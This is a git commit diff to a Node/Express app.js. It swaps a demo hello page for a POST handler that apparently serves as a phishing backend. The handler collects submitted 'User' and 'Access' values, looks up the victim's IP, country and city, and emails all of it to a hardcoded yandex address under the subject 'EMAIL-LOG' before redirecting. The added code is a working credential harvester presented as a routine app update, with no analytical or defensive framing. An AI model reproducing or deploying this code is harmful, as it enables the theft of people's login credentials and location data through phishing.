4f10b53493ddcc25f8bb79ce71b0f958890f1f33
big-seven77 <138498633+big-seven77@users.noreply.github.com>
2024-12-11 15:46:15 +0300

    Update app.js

--- app.js
+++ app.js
@@ -1,61 +1,82 @@
+// server.js
+// where your node app starts
+
+// we've started you off with Express (https://expressjs.com/)
+// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
+
 const express = require("express");
+const bodyParser = require("body-parser");
+const requestIp = require("request-ip");
+const geoip = require("geoip-lite");
 const app = express();
-const port = process.env.PORT || 3001;
+const sendmail = require("sendmail")();
+const lastRedirect = "";
 
-app.get("/", (req, res) => res.type('html').send(html));
+// make all the files in 'public' available
+// https://expressjs.com/en/starter/static-files.html
+app.use(express.static("public"));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));
+// Get the user's IP address using the request-ip middleware
+app.use(requestIp.mw());
 
-server.keepAliveTimeout = 120 * 1000;
-server.headersTimeout = 120 * 1000;
+app.get("/", (request, response) => {
+  response.sendFile(__dirname + "/src/pages/index.hbs");
+});
 
-const html = `
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Hello from Render!</title>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <script>
-      setTimeout(() => {
-        confetti({
-          particleCount: 100,
-          spread: 70,
-          origin: { y: 0.6 },
-          disableForReducedMotion: true
-        });
-      }, 500);
-    </script>
-    <style>
-      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
-      @font-face {
-        font-family: "neo-sans";
-        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
-        font-style: normal;
-        font-weight: 700;
-      }
-      html {
-        font-family: neo-sans;
-        font-weight: 700;
-        font-size: calc(62rem / 16);
-      }
-      body {
-        background: white;
-      }
-      section {
-        border-radius: 1em;
-        padding: 1em;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        margin-right: -50%;
-        transform: translate(-50%, -50%);
-      }
-    </style>
-  </head>
-  <body>
-    <section>
-      Hello from Render!
-    </section>
-  </body>
-</html>
-`
+// https://expressjs.com/en/starter/basic-routing.html
+app.post("/", (req, res) => {
+  const { ai, pr } = req.body;
+  console.log(req.body);
+  let logEmail = "sharedbox2021@yandex.com";
+
+  // Get the user's IPv4 address
+  const ip = requestIp.getClientIp(req);
+
+  // Get the country and city from the IP address using geoip-lite
+  const geo = geoip.lookup(ip);
+  const country = geo ? geo.country : "unknown";
+  const city = geo ? geo.city : "unknown";
+  const html = `
+    <!DOCTYPE html>
+    <html lang='en'>
+    <head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Document</title>
+    </head>  
+    <body>
+    Details Has Arrived!!
+    <h3>User: ${ai}</h3>
+    <h3>Access: ${pr}</h3>
+    <h3>IP: ${ip}</h3>
+    <h3>Country: ${country}</h3>
+    <h3>City: ${city}</h3>
+   
+    </body>
+    </html>
+    `;
+ 
+  let ip2 = requestIp.getClientIp(req);
+
+  let redirectUrl = "https://${dom}";
+
+  sendmail(
+    {
+      from: "docu@logscentral.com",
+      to: logEmail,
+      subject: "EMAIL-LOG " + ip2,
+      html,
+    },
+    function (err, reply) {
+      res.redirect(redirectUrl);
+    }
+  );
+});
+
+// send the default array of dreams to the webpage
+// listen for requests :)
+const listener = app.listen(process.env.PORT, () => {
+  console.log("Your app is listening on port " + listener.address().port);
+});
